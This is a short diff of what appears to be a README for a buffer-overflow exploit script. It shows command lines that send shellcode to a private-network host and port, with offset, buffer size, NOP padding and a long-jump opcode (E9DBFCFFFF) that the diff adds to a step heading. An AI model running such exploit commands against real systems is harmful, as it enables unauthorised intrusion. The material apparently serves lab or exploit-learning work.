@@ -93,7 +93,7 @@ write - Sends malicious shell code (hex string file) via buffer overflow
 ./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4085 --buffhead='cmd2 /.../' --offset=3290 --hexcontent=g90EB0890l62501301
 ```
 
-4. Long jump to head content
+4. Long jump (E9DBFCFFFF) to head content
 ```
 ./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4085 --buffhead='cmd2 /.../' --offset=3290 --hexcontent=g90EB0890l62501301 --after=gE9DBFCFFFF --nopsa=4
 ```
